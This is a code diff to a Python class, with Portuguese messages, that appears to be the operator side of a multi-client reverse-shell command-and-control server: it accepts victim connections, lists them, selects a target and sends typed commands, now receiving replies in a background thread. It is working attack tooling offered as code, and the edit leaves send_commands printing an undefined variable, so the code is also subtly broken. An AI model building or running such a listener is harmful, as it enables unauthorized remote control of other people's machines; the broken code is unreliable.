@@ -32,6 +32,20 @@ class MikModule:
         except socket.error as msg:
             print(f'[!] Falha ao vincular o socket: {str(msg)}\n')
 
+    def recv_commands(self, client_socket):
+        while True:
+            try:
+                client_response = str(client_socket.recv(2048), 'utf-8')
+                if client_response:
+                    print(f"{client_socket}: {client_response}")
+                else:
+                    print(f"Cliente desconectado.")
+                    break
+            except:
+                print('[-] Erro ao receber comando')
+                break
+
+    
     def accept_connections(self):
         while True:
             client_socket, client_address = self.server_socket.accept()
@@ -39,7 +53,10 @@ class MikModule:
             self.connected_connections.append(client_socket)
             self.connected_addresses.append(client_address)
             print('[+] Servidor conectado com sucesso a', client_address[0])
-
+            recv_thread = threading.Thread(target=self.recv_commands, args=(client_socket,))
+            recv_thread.daemon = True
+            recv_thread.start()
+            
     def list_connections(self):
         print("Active Connections:")
         for i, client_address in enumerate(self.connected_addresses):
@@ -57,7 +74,7 @@ class MikModule:
             print('[+] Erro de conexão')
             return None
 
-    def send_recv_commands(self, your_connection):
+    def send_commands(self, your_connection):
         while True:
             try:
                 server_input = input('cmd> ')
@@ -65,7 +82,6 @@ class MikModule:
                     break
                 if len(str.encode(server_input)) > 0:
                     your_connection.send(str.encode(server_input))
-                    client_response = str(your_connection.recv(2048), 'utf-8')
                     print(client_response)
             except:
                 print('[-] Erro ao enviar comandos')
@@ -106,7 +122,7 @@ class MikModule:
             elif 'select' in server_command:
                 your_connection = self.get_target_connection(server_command)
                 if your_connection is not None:
-                    self.send_recv_commands(your_connection)
+                    self.send_commands(your_connection)
                 else:
                     print(server_command[7:], ' comando não existe')
             elif server_command.lower() == 'background':
